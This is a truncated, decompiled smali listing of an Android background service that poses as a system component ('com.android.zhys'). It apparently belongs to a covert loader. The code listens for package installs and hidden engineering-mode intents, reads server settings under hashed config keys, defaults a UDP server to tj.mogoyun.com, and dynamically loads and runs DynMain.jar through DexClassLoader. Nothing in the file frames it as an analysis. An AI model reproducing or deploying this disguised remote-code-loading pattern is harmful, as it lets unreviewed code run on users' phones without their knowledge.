.class public Lcom/android/zhys/Main;
.super Landroid/app/Service;
.source "Main.java"

# interfaces
.implements Lcom/ck/services/statistics/IStatistics;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/zhys/Main$Pacemaker;,
        Lcom/android/zhys/Main$PacemakerBCReceiver;,
        Lcom/android/zhys/Main$PackageBCReceiver;
    }
.end annotation


# static fields
.field private static final TAG:Ljava/lang/String; = "Shell"


# instance fields
.field private isDynPackLoaded:Z

.field private mAppletContext:Landroid/content/Context;

.field private mCurSysTime:Landroid/text/format/Time;

.field private mDynMain:Lcom/ck/services/statistics/IDynMain;

.field private mMainExecutorPool:Ljava/util/concurrent/ExecutorService;

.field private final mMainHandler:Landroid/os/Handler;

.field private mMainPacemaker:Lcom/android/zhys/Main$Pacemaker;

.field private mNetClient:Lcom/ck/services/modules/INetClient;

.field private mPacemakerBCReceiver:Lcom/android/zhys/Main$PacemakerBCReceiver;

.field private mPackLoaderTask:Lcom/ck/services/task/TaskPackLoader;

.field private mPackageBCReceiver:Lcom/android/zhys/Main$PackageBCReceiver;

.field private mSecretCodeListner:Landroid/content/BroadcastReceiver;

.field private mShellConfig:Lcom/ck/services/modules/IMainConfig;

.field private mShellInfo:Lcom/ck/services/statistics/IStatistics$ShellInfo;

.field private noPackLastingTime:I


# direct methods
.method public constructor <init>()V
    .locals 2

    .prologue
    const/4 v1, 0x0

    const/4 v0, 0x0

    .line 44
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 47
    iput-object v0, p0, Lcom/android/zhys/Main;->mShellInfo:Lcom/ck/services/statistics/IStatistics$ShellInfo;

    .line 49
    iput-object v0, p0, Lcom/android/zhys/Main;->mAppletContext:Landroid/content/Context;

    .line 50
    iput-object v0, p0, Lcom/android/zhys/Main;->mMainPacemaker:Lcom/android/zhys/Main$Pacemaker;

    .line 51
    iput-object v0, p0, Lcom/android/zhys/Main;->mPacemakerBCReceiver:Lcom/android/zhys/Main$PacemakerBCReceiver;

    .line 52
    iput-object v0, p0, Lcom/android/zhys/Main;->mMainExecutorPool:Ljava/util/concurrent/ExecutorService;

    .line 53
    iput-object v0, p0, Lcom/android/zhys/Main;->mPackageBCReceiver:Lcom/android/zhys/Main$PackageBCReceiver;

    .line 55
    iput-object v0, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    .line 56
    iput-object v0, p0, Lcom/android/zhys/Main;->mNetClient:Lcom/ck/services/modules/INetClient;

    .line 58
    iput-object v0, p0, Lcom/android/zhys/Main;->mDynMain:Lcom/ck/services/statistics/IDynMain;

    .line 60
    iput-boolean v1, p0, Lcom/android/zhys/Main;->isDynPackLoaded:Z

    .line 61
    iput v1, p0, Lcom/android/zhys/Main;->noPackLastingTime:I

    .line 63
    iput-object v0, p0, Lcom/android/zhys/Main;->mPackLoaderTask:Lcom/ck/services/task/TaskPackLoader;

    .line 65
    iput-object v0, p0, Lcom/android/zhys/Main;->mCurSysTime:Landroid/text/format/Time;

    .line 73
    new-instance v0, Lcom/android/zhys/Main$1;

    invoke-direct {v0, p0}, Lcom/android/zhys/Main$1;-><init>(Lcom/android/zhys/Main;)V

    iput-object v0, p0, Lcom/android/zhys/Main;->mSecretCodeListner:Landroid/content/BroadcastReceiver;

    .line 248
    new-instance v0, Lcom/android/zhys/Main$2;

    invoke-direct {v0, p0}, Lcom/android/zhys/Main$2;-><init>(Lcom/android/zhys/Main;)V

    iput-object v0, p0, Lcom/android/zhys/Main;->mMainHandler:Landroid/os/Handler;

    .line 44
    return-void
.end method

.method static synthetic access$0(Lcom/android/zhys/Main;)V
    .locals 0

    .prologue
    .line 306
    invoke-direct {p0}, Lcom/android/zhys/Main;->doReboot()V

    return-void
.end method

.method static synthetic access$1(Lcom/android/zhys/Main;)Z
    .locals 1

    .prologue
    .line 60
    iget-boolean v0, p0, Lcom/android/zhys/Main;->isDynPackLoaded:Z

    return v0
.end method

.method static synthetic access$10(Lcom/android/zhys/Main;)Landroid/text/format/Time;
    .locals 1

    .prologue
    .line 65
    iget-object v0, p0, Lcom/android/zhys/Main;->mCurSysTime:Landroid/text/format/Time;

    return-object v0
.end method

.method static synthetic access$11(Lcom/android/zhys/Main;)Landroid/os/Handler;
    .locals 1

    .prologue
    .line 248
    iget-object v0, p0, Lcom/android/zhys/Main;->mMainHandler:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic access$2(Lcom/android/zhys/Main;Z)V
    .locals 0

    .prologue
    .line 60
    iput-boolean p1, p0, Lcom/android/zhys/Main;->isDynPackLoaded:Z

    return-void
.end method

.method static synthetic access$3(Lcom/android/zhys/Main;)Lcom/ck/services/statistics/IDynMain;
    .locals 1

    .prologue
    .line 58
    iget-object v0, p0, Lcom/android/zhys/Main;->mDynMain:Lcom/ck/services/statistics/IDynMain;

    return-object v0
.end method

.method static synthetic access$4(Lcom/android/zhys/Main;)V
    .locals 0

    .prologue
    .line 227
    invoke-direct {p0}, Lcom/android/zhys/Main;->loadDynamicPack()V

    return-void
.end method

.method static synthetic access$5(Lcom/android/zhys/Main;)Lcom/ck/services/task/TaskPackLoader;
    .locals 1

    .prologue
    .line 63
    iget-object v0, p0, Lcom/android/zhys/Main;->mPackLoaderTask:Lcom/ck/services/task/TaskPackLoader;

    return-object v0
.end method

.method static synthetic access$6(Lcom/android/zhys/Main;)I
    .locals 1

    .prologue
    .line 61
    iget v0, p0, Lcom/android/zhys/Main;->noPackLastingTime:I

    return v0
.end method

.method static synthetic access$7(Lcom/android/zhys/Main;)Lcom/ck/services/modules/INetClient;
    .locals 1

    .prologue
    .line 56
    iget-object v0, p0, Lcom/android/zhys/Main;->mNetClient:Lcom/ck/services/modules/INetClient;

    return-object v0
.end method

.method static synthetic access$8(Lcom/android/zhys/Main;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 244
    invoke-direct {p0, p1}, Lcom/android/zhys/Main;->showToast(Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$9(Lcom/android/zhys/Main;I)V
    .locals 0

    .prologue
    .line 61
    iput p1, p0, Lcom/android/zhys/Main;->noPackLastingTime:I

    return-void
.end method

.method private buildShellInfo()V
    .locals 7

    .prologue
    .line 202
    new-instance v3, Lcom/ck/services/statistics/IStatistics$ShellInfo;

    invoke-direct {v3}, Lcom/ck/services/statistics/IStatistics$ShellInfo;-><init>()V

    iput-object v3, p0, Lcom/android/zhys/Main;->mShellInfo:Lcom/ck/services/statistics/IStatistics$ShellInfo;

    .line 205
    :try_start_0
    iget-object v3, p0, Lcom/android/zhys/Main;->mAppletContext:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    invoke-virtual {p0}, Lcom/android/zhys/Main;->getPackageName()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0x80

    invoke-virtual {v3, v4, v5}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    .line 206
    .local v0, "appInfo":Landroid/content/pm/ApplicationInfo;
    iget-object v3, p0, Lcom/android/zhys/Main;->mShellInfo:Lcom/ck/services/statistics/IStatistics$ShellInfo;

    iget-object v4, v0, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    const-string v5, "ww_proj"

    invoke-virtual {v4, v5}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/ck/services/statistics/IStatistics$ShellInfo;->mAppletId:Ljava/lang/String;

    .line 208
    iget-object v3, p0, Lcom/android/zhys/Main;->mShellInfo:Lcom/ck/services/statistics/IStatistics$ShellInfo;

    iget-object v3, v3, Lcom/ck/services/statistics/IStatistics$ShellInfo;->mAppletId:Ljava/lang/String;

    const-string v4, "4"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_0

    iget-object v3, p0, Lcom/android/zhys/Main;->mShellInfo:Lcom/ck/services/statistics/IStatistics$ShellInfo;

    iget-object v3, v3, Lcom/ck/services/statistics/IStatistics$ShellInfo;->mAppletId:Ljava/lang/String;

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v3

    const/4 v4, 0x4

    if-eq v3, v4, :cond_1

    .line 209
    :cond_0
    iget-object v3, p0, Lcom/android/zhys/Main;->mShellInfo:Lcom/ck/services/statistics/IStatistics$ShellInfo;

    const/4 v4, 0x0

    iput-object v4, v3, Lcom/ck/services/statistics/IStatistics$ShellInfo;->mAppletId:Ljava/lang/String;

    .line 210
    iget-object v3, p0, Lcom/android/zhys/Main;->mAppletContext:Landroid/content/Context;

    const-string v4, "\u8bf7\u8bbe\u7f6e\u6b63\u786e\u7684ww_proj\u503c(\"4xxx\",x\u4e3a\u6570\u5b57\u6216\u5b57\u6bcd\uff0c\u5b57\u6bcd\u4e0d\u533a\u5206\u5927\u5c0f\u5199)"

    const/4 v5, 0x1

    invoke-static {v3, v4, v5}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    .line 225
    .end local v0    # "appInfo":Landroid/content/pm/ApplicationInfo;
    :goto_0
    return-void

    .line 213
    .restart local v0    # "appInfo":Landroid/content/pm/ApplicationInfo;
    :cond_1
    iget-object v3, p0, Lcom/android/zhys/Main;->mShellInfo:Lcom/ck/services/statistics/IStatistics$ShellInfo;

    iget-object v4, p0, Lcom/android/zhys/Main;->mShellInfo:Lcom/ck/services/statistics/IStatistics$ShellInfo;

    iget-object v4, v4, Lcom/ck/services/statistics/IStatistics$ShellInfo;->mAppletId:Ljava/lang/String;

    sget-object v5, Ljava/util/Locale;->US:Ljava/util/Locale;

    invoke-virtual {v4, v5}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/ck/services/statistics/IStatistics$ShellInfo;->mAppletId:Ljava/lang/String;

    .line 215
    iget-object v3, p0, Lcom/android/zhys/Main;->mShellInfo:Lcom/ck/services/statistics/IStatistics$ShellInfo;

    iget-object v4, v0, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    const-string v5, "ww_verinfo"

    invoke-virtual {v4, v5}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/ck/services/statistics/IStatistics$ShellInfo;->mVersionInfo:Ljava/lang/String;

    .line 217
    iget-object v3, p0, Lcom/android/zhys/Main;->mAppletContext:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    iget-object v4, p0, Lcom/android/zhys/Main;->mAppletContext:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {v3, v4, v5}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v2

    .line 218
    .local v2, "packageInfo":Landroid/content/pm/PackageInfo;
    iget-object v3, p0, Lcom/android/zhys/Main;->mShellInfo:Lcom/ck/services/statistics/IStatistics$ShellInfo;

    iget v4, v2, Landroid/content/pm/PackageInfo;->versionCode:I

    iput v4, v3, Lcom/ck/services/statistics/IStatistics$ShellInfo;->mVersionCode:I
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    .line 224
    .end local v0    # "appInfo":Landroid/content/pm/ApplicationInfo;
    .end local v2    # "packageInfo":Landroid/content/pm/PackageInfo;
    :goto_1
    iget-object v3, p0, Lcom/android/zhys/Main;->mShellInfo:Lcom/ck/services/statistics/IStatistics$ShellInfo;

    iget-object v4, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    const-string v5, "93c5bebdea9c94a0740fe6fd9bb250f0"

    const/4 v6, -0x1

    invoke-interface {v4, v5, v6}, Lcom/ck/services/modules/IMainConfig;->getIntValue(Ljava/lang/String;I)I

    move-result v4

    iput v4, v3, Lcom/ck/services/statistics/IStatistics$ShellInfo;->mCustId:I

    goto :goto_0

    .line 220
    :catch_0
    move-exception v1

    .line 221
    .local v1, "e1":Landroid/content/pm/PackageManager$NameNotFoundException;
    invoke-virtual {v1}, Landroid/content/pm/PackageManager$NameNotFoundException;->printStackTrace()V

    goto :goto_1
.end method

.method private doReboot()V
    .locals 2

    .prologue
    .line 307
    const-string v0, "Shell"

    const-string v1, "!!!terminate service!!!"

    invoke-static {v0, v1}, Lcom/ck/services/application/LOG;->E(Ljava/lang/String;Ljava/lang/String;)V

    .line 308
    invoke-virtual {p0}, Lcom/android/zhys/Main;->stopSelf()V

    .line 309
    return-void
.end method

.method private loadDynamicPack()V
    .locals 7

    .prologue
    .line 228
    new-instance v4, Ljava/lang/StringBuilder;

    iget-object v5, p0, Lcom/android/zhys/Main;->mAppletContext:Landroid/content/Context;

    invoke-virtual {v5}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v5, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "DynMain.jar"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 229
    .local v2, "dexPath":Ljava/lang/String;
    iget-object v4, p0, Lcom/android/zhys/Main;->mAppletContext:Landroid/content/Context;

    invoke-static {v4, v2}, Lcom/ck/services/statistics/DexLoader;->loadDex(Landroid/content/Context;Ljava/lang/String;)Ldalvik/system/DexClassLoader;

    move-result-object v1

    .line 230
    .local v1, "clsLoader":Ldalvik/system/DexClassLoader;
    const-string v4, "com.ck.services.pack.shell.DynMain"

    invoke-static {v1, v4}, Lcom/ck/services/statistics/DexLoader;->loadClass(Ldalvik/system/DexClassLoader;Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    .line 231
    .local v0, "cls":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    if-eqz v0, :cond_0

    .line 233
    :try_start_0
    invoke-virtual {v0}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Lcom/ck/services/statistics/IDynMain;

    iput-object v4, p0, Lcom/android/zhys/Main;->mDynMain:Lcom/ck/services/statistics/IDynMain;

    .line 234
    iget-object v4, p0, Lcom/android/zhys/Main;->mDynMain:Lcom/ck/services/statistics/IDynMain;

    invoke-interface {v4, p0}, Lcom/ck/services/statistics/IDynMain;->onCreate(Lcom/ck/services/statistics/IStatistics;)V

    .line 235
    iget-object v4, p0, Lcom/android/zhys/Main;->mMainHandler:Landroid/os/Handler;

    const/16 v5, 0x2b

    invoke-virtual {v4, v5}, Landroid/os/Handler;->sendEmptyMessage(I)Z
    :try_end_0
    .catch Ljava/lang/InstantiationException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/IllegalAccessException; {:try_start_0 .. :try_end_0} :catch_1

    .line 242
    :cond_0
    :goto_0
    return-void

    .line 236
    :catch_0
    move-exception v3

    .line 237
    .local v3, "e":Ljava/lang/InstantiationException;
    const-string v4, "Shell"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "InstantiationException "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/InstantiationException;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Lcom/ck/services/application/LOG;->E(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 238
    .end local v3    # "e":Ljava/lang/InstantiationException;
    :catch_1
    move-exception v3

    .line 239
    .local v3, "e":Ljava/lang/IllegalAccessException;
    const-string v4, "Shell"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "IllegalAccessException "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/IllegalAccessException;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Lcom/ck/services/application/LOG;->E(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method private showToast(Ljava/lang/String;)V
    .locals 2
    .param p1, "text"    # Ljava/lang/String;

    .prologue
    .line 245
    iget-object v0, p0, Lcom/android/zhys/Main;->mAppletContext:Landroid/content/Context;

    const/4 v1, 0x1

    invoke-static {v0, p1, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 246
    return-void
.end method

.method private shutdownAndAwaitTermination(Ljava/util/concurrent/ExecutorService;)V
    .locals 4
    .param p1, "pool"    # Ljava/util/concurrent/ExecutorService;

    .prologue
    .line 179
    invoke-interface {p1}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    .line 182
    const-wide/16 v2, 0x3c

    :try_start_0
    sget-object v1, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-interface {p1, v2, v3, v1}, Ljava/util/concurrent/ExecutorService;->awaitTermination(JLjava/util/concurrent/TimeUnit;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 183
    invoke-interface {p1}, Ljava/util/concurrent/ExecutorService;->shutdownNow()Ljava/util/List;

    .line 185
    const-wide/16 v2, 0x3c

    sget-object v1, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-interface {p1, v2, v3, v1}, Ljava/util/concurrent/ExecutorService;->awaitTermination(JLjava/util/concurrent/TimeUnit;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 186
    sget-object v1, Ljava/lang/System;->err:Ljava/io/PrintStream;

    const-string v2, "Pool did not terminate"

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 194
    :cond_0
    :goto_0
    return-void

    .line 188
    :catch_0
    move-exception v0

    .line 190
    .local v0, "ie":Ljava/lang/InterruptedException;
    invoke-interface {p1}, Ljava/util/concurrent/ExecutorService;->shutdownNow()Ljava/util/List;

    .line 192
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Thread;->interrupt()V

    goto :goto_0
.end method


# virtual methods
.method public getAppletContext()Landroid/content/Context;
    .locals 1

    .prologue
    .line 325
    invoke-virtual {p0}, Lcom/android/zhys/Main;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    return-object v0
.end method

.method public getRegServerIp()Ljava/lang/String;
    .locals 3

    .prologue
    .line 385
    iget-object v0, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    const-string v1, "f3c744d950bf70dfc8c7cbcae23f26fa"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Lcom/ck/services/modules/IMainConfig;->getStringValue(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getRegServerPort()I
    .locals 3

    .prologue
    .line 389
    iget-object v0, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    const-string v1, "a093e159930c7b744f1a84171889b044"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Lcom/ck/services/modules/IMainConfig;->getIntValue(Ljava/lang/String;I)I

    move-result v0

    return v0
.end method

.method public getShellInfo()Lcom/ck/services/statistics/IStatistics$ShellInfo;
    .locals 1

    .prologue
    .line 356
    iget-object v0, p0, Lcom/android/zhys/Main;->mShellInfo:Lcom/ck/services/statistics/IStatistics$ShellInfo;

    return-object v0
.end method

.method public getShellService(Ljava/lang/String;)Ljava/lang/Object;
    .locals 1
    .param p1, "name"    # Ljava/lang/String;

    .prologue
    .line 313
    const-string v0, "instance_netclient"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 314
    iget-object v0, p0, Lcom/android/zhys/Main;->mNetClient:Lcom/ck/services/modules/INetClient;

    .line 320
    :goto_0
    return-object v0

    .line 315
    :cond_0
    const-string v0, "instance_preferences"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 316
    iget-object v0, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    goto :goto_0

    .line 317
    :cond_1
    const-string v0, "instance_packcore"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 318
    iget-object v0, p0, Lcom/android/zhys/Main;->mDynMain:Lcom/ck/services/statistics/IDynMain;

    goto :goto_0

    .line 320
    :cond_2
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public getUdpServer()Lcom/ck/services/statistics/IStatistics$UdpServer;
    .locals 4

    .prologue
    .line 361
    new-instance v0, Lcom/ck/services/statistics/IStatistics$UdpServer;

    invoke-direct {v0}, Lcom/ck/services/statistics/IStatistics$UdpServer;-><init>()V

    .line 363
    .local v0, "server":Lcom/ck/services/statistics/IStatistics$UdpServer;
    iget-object v1, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    const-string v2, "2f735cc2a65622296859b7bacce72a68"

    const-string v3, "tj.mogoyun.com"

    invoke-interface {v1, v2, v3}, Lcom/ck/services/modules/IMainConfig;->getStringValue(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/ck/services/statistics/IStatistics$UdpServer;->mIP:Ljava/lang/String;

    .line 364
    iget-object v1, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    const-string v2, "5507b177feeae534e7517519ed64999b"

    const/16 v3, 0x19c8

    invoke-interface {v1, v2, v3}, Lcom/ck/services/modules/IMainConfig;->getIntValue(Ljava/lang/String;I)I

    move-result v1

    iput v1, v0, Lcom/ck/services/statistics/IStatistics$UdpServer;->mMinPort:I

    .line 365
    iget-object v1, p0, Lcom/android/zhys/Main;->mShellConfig:Lcom/ck/services/modules/IMainConfig;

    const-string v2, "bef42c377df6e66c43c0bf2e02eb08c6"

    const/16 v3, 0x19d1

    invoke-interface {v1, v2, v3}, Lcom/ck/services/modules/IMainConfig;->getIntValue(Ljava/lang/String;I)I

    move-result v1

    iput v1, v0, Lcom/ck/services/statistics/IStatistics$UdpServer;->mMaxPort:I

    .line 367
    return-object v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "arg0"    # Landroid/content/Intent;

    .prologue
    .line 70
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 7

    .prologue
    const/4 v6, 0x0

    .line 88
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 104
    const/4 v3, 0x0

    iput v3, p0, Lcom/android/zhys/Main;->noPackLastingTime:I

    .line 105
    new-instance v3, Landroid/text/format/Time;

    invoke-direct {v3}, Landroid/text/format/Time;-><init>()V

    iput-object v3, p0, Lcom/android/zhys/Main;->mCurSysTime:Landroid/text/format/Time;

    .line 107
    invoke-virtual {p0}, Lcom/android/zhys/Main;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    iput-object v3, p0, Lcom/android/zhys/Main;->mAppletContext:Landroid/content/Context;

    .line 109
    new-instance v3, Lcom/android/zhys/Main$Pacemaker;

    iget-object v4, p0, Lcom/android/zhys/Main;->mAppletContext:Landroid/content/Context;

    invoke-direct {v3, p0, v4}, Lcom/android/zhys/Main$Pacemaker;-><init>(Lcom/android/zhys/Main;Landroid/content/Context;)V

    iput-object v3, p0, Lcom/android/zhys/Main;->mMainPacemaker:Lcom/android/zhys/Main$Pacemaker;

    .line 110
    iget-object v3, p0, Lcom/android/zhys/Main;->mMainPacemaker:Lcom/android/zhys/Main$Pacemaker;

    const-wide/32 v4, 0xea60

    invoke-virtual {v3, v4, v5}, Lcom/android/zhys/Main$Pacemaker;->init(J)V

    .line 112
    new-instance v3, Lcom/android/zhys/Main$PacemakerBCReceiver;

    invoke-direct {v3, p0, v6}, Lcom/android/zhys/Main$PacemakerBCReceiver;-><init>(Lcom/android/zhys/Main;Lcom/android/zhys/Main$PacemakerBCReceiver;)V

    iput-object v3, p0, Lcom/android/zhys/Main;->mPacemakerBCReceiver:Lcom/android/zhys/Main$PacemakerBCReceiver;

    .line 113
    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    .line 114
    .local v0, "filter":Landroid/content/IntentFilter;
    const-string v3, "com.ck.services.intent.ACTION_ONEMIN_TICK"

    invoke-virtual {v0, v3}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 115
    const-string v3, "com.ck.services.intent.ACTION_TENMIN_TICK"

    invoke-virtual {v0, v3}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 116
    const-string v3, "com.ck.services.intent.ACTION_ONEHOUR_TICK"

    invoke-virtual {v0, v3}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 117
    iget-object v3, p0, Lcom/android/zhys/Main;->mPacemakerBCReceiver:Lcom/android/zhys/Main$PacemakerBCReceiver;

    invoke-virtual {p0, v3, v0}, Lcom/android/zhys/Main;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 119
    new-instance v3, Lcom/android/zhys/Main$PackageBCReceiver;

    invoke-direct {v3, p0, v6}, Lcom/android/zhys/Main$PackageBCReceiver;-><init>(Lcom/android/zhys/Main;Lcom/android/zhys/Main$PackageBCReceiver;)V

    iput-object v3, p0, Lcom/android/zhys/Main;->mPackageBCReceiver:Lcom/android/zhys/Main$PackageBCReceiver;

    .line 120
    new-instance v1, Landroid/content/IntentFilter;

    invoke-direct {v1}, Landroid/content/IntentFilter;-><init>()V

    .line 121
    .local v1, "pbcFilter":Landroid/content/IntentFilter;
    const-string v3, "android.intent.action.PACKAGE_ADDED"

    invoke-virtual {v1, v3}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 122
    const-string v3, "android.intent.action.PACKAGE_REPLACED"

    invoke-virtual {v1, v3}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 123
    const-string v3, "android.intent.action.PACKAGE_REMOVED"

    invoke-virtual {v1, v3}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 124
    const-string v3, "package"

    invoke-virtual {v1, v3}, Landroid/content/IntentFilter;->addDataScheme(Ljava/lang/String;)V

    .line 125
    iget-object v3, p0, Lcom/android/zhys/Main;->mPackageBCReceiver:Lcom/android/zhys/Main$PackageBCReceiver;

    invoke-virtual {p0, v3, v1}, Lcom/android/zhys/Main;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 127
    new-instance v2, Landroid/content/IntentFilter;

    invoke-direct {v2}, Landroid/content/IntentFilter;-><init>()V

    .line 128
    .local v2, "scodeFilter":Landroid/content/IntentFilter;
    const-string v3, "com.ck.services.intent.ACTIVE_ENG_MODE"

    invoke-virtual {v2, v3}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 129
    const-string v3, "com.ck.services.intent.DEACTIVE_ENG_MODE"

    invoke-virtual {v2, v3}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 130
    iget-object v3, p0, Lcom/android/zhys/Main;->mSecretCodeListner:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v3, v2, v6, v6}, Lcom/android/zhys/Main;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;Ljava/lang/String;Landroid/os/Handler;)Landroid/content/Intent;

    .line 132
    new-instance v3, Lcom/ck/services/modules/NetClient;

    invoke-direct {v3}, Lcom/ck/services/modules/NetClient;-><init>()V

    iput-object v3, p0, Lcom/android/zhys/Main;->mNetClient:Lcom/ck/services/modules/INetClient;

    .line 133
    iget-object v3, p0, Lcom/android/zhys/Main;->mNetClient:Lcom/ck/services/modules/INetClient;

